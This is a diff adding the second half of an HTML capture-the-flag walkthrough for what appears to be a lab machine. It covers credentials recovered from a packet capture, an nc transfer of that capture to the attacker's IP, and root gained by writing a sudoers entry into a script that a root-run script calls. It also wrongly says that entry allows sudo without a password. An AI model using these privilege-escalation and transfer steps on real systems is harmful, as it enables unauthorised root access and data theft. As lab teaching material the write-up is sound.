@@ -199,4 +199,47 @@ nc <Your_IP> <port> < suspicious.pcapng
 </pre></code>
 <p>Now run wireshark and open the file.</p>
 <p>After some trial and error i found valuable information in <code>tcp.stream eq 7</code> folowing following tcp stream.</p>
-<img src="">
+
+
+<img src="pictures/redacted.png">
+<p>We just got username and password!!!Lets change the user now! </p>
+<p>Go to lennies directory and cat the user.txt</p>
+<pre><code>
+$ cat user.txt
+<b><---REDACTED---></b>
+</pre></code>
+<p>Hmm lets check what is in directory <code>scripts</code></p>
+<p>There is a script called planner.sh and has root ownership</p>
+<pre><code>
+$ ls -la planner.sh 
+-rwxr-xr-x 1 root root 77 Nov 12 04:53 planner.sh
+</pre></code>
+<pre><code>
+$ cat planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+</pre></code>
+<p>This script calls another script named <code>print.sh</code>, which happens to be owned by us!</p>
+<pre><code>
+$ ls -la /etc/print.sh 
+-rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh
+</pre></code>
+<p>SO! We can write our code in <code>print.sh</code> and <code>planner.sh</code> will execute it with root privaleges! Preety neat!</p>
+<p>I edited <code>print.sh</code> with <code>vim</code> so at the end it looks like this:</p>
+<pre><code>
+#!/bin/bash
+echo "lennie ALL=(ALL) ALL" >> /etc/sudoers
+</pre></code>
+<p>This will allow lennie to execute all comands with sudo without any password! All we got to do now is type <code>sudo su</code> and we are root!</p>
+<pre><code>
+# cat root.txt
+<b><---REDACTED---></b>
+</pre></code>
+<p>And we are done! CONGRATS!</p>
+
+<p>Don't forget to drink some water and happy hacking! </p>
+
+
+
+
